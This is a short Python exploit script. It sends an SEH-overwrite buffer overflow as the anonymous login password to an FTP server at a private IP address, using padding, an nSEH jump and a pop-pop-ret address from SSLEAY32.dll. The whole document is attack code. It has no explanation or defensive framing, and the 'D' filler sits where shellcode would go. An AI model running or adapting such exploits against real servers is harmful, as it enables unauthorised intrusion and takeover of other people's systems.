import socket
import os
import sys
import struct
from ftplib import FTP


nSEH = "\x74\x0B\x75\x09"           # NetJumping
SEH = struct.pack("<I", 0x100107b3) # ppr -SSLEAY32.dll

buffer  = "\x2c"
buffer += "A" * 2559
buffer += nSEH
buffer += SEH
buffer += "D" * (4000 - len(buffer))

print "[*] Sending evil ftp request to target"
ftp = FTP()
ftp.connect('192.168.100.118', 21)
ftp.login('anonymous', buffer)

